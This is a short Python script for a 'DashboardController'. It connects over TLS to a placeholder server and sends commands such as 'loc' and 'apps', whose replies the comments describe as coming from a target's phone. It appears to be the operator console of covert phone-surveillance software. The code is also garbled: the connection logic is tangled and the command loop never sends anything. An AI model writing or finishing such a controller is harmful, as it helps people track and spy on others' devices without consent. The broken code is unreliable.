import json, socket, ssl, requests, time

class DashboardController:
    def __init__(self):
        self.target_ip = "YOUR_SERVER_IP.com" 
        self.port = 9001
    
    def connect(self):
        ctx = ssl.create_default_context()
        sock = ctx.wrap_socket(socket.socket(), server_hostname=self.target_ip)
        sock.connect((self.target_ip, self.port))
        return sock
    
    def send_command(self, command_type):
        payload = {"type": command_type}
        
        try:
            sock = self.connect() if not hasattr(self, 'sock') else getattr(self, '_sock', lambda:self.connect())() # Simplified connection logic
            
            message = json.dumps(payload).encode()
            
            print(f">> Sending Command to Remote Device: {command_type}")
            sock.sendall(message)
            
            response = sock.recv(1024).decode() # Get the reply from their phone
            print(f"<< Response from Target: {response}")

        except Exception as e:
            print(f"[!] Error communicating with target: {e}")
    
    def run_dashboard(self):
        while True:
            cmd = input("\nDashboard Command (loc/apps/quit): ").lower().strip() or 'ping'
            
            if cmd == 'quit': break
            
            self.connect() # Re-establish connection for each command to ensure reliability over long distances
            
if __name__ == "__main__":
    DashboardController().run_dashboard()
